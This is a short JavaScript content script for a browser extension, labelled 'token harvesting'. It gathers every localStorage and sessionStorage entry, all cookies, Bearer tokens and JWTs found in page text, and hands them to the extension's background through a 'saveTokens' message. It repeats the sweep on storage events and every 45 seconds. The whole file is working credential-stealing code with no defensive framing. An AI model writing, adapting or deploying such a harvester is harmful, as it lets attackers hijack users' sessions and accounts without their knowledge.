// content.js: token harvesting
(function () {
  const store = [];

  function collectTokens() {
    const keys = [
      ...Object.entries(localStorage).map(([k,v]) => ({ type: 'localStorage', key: k, value: v })),
      ...Object.entries(sessionStorage).map(([k,v]) => ({ type: 'sessionStorage', key: k, value: v })),
      ...document.cookie.split(';').filter(Boolean).map((pair) => {
        const [key,value] = pair.trim().split('=');
        return { type: 'cookie', key, value };
      })
    ];

    const bearer = Array.from(document.querySelectorAll('*')).reduce((acc, el) => {
      if (el.textContent?.includes('Bearer ')) acc.push({ type: 'bearer', value: el.textContent.match(/Bearer\s+([A-Za-z0-9-\._~\+/]+=*)/)?.[1] });
      return acc;
    }, []);

    const jwtReg = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
    const jwtMatches = (document.body.textContent || '').match(jwtReg) || [];

    const tokens = [...keys, ...bearer.filter(Boolean), ...jwtMatches.map((j) => ({ type: 'jwt', value: j }))].filter((v) => v && v.value);

    if (tokens.length > 0) {
      chrome.runtime.sendMessage({ type: 'saveTokens', tokens });
    }
  }

  collectTokens();
  window.addEventListener('storage', collectTokens);
  setInterval(collectTokens, 45000);
})();
